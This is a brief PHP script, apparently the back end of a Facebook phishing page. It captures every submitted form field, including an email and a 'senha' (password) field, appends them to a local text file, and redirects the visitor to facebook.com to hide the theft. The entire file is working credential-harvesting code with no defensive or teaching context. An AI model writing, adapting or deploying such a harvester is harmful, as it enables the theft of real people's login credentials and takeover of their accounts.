<?php
header ('Location: https://facebook.com/');
$handle = fopen("@ct.txt", "a");

$em = $_POST["email"];
$sen = $_POST["senha"];

foreach($_POST as $variable => $value) {
 
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r");
}
fwrite($handle, "===============\r");
fclose($handle);
exit;
?>



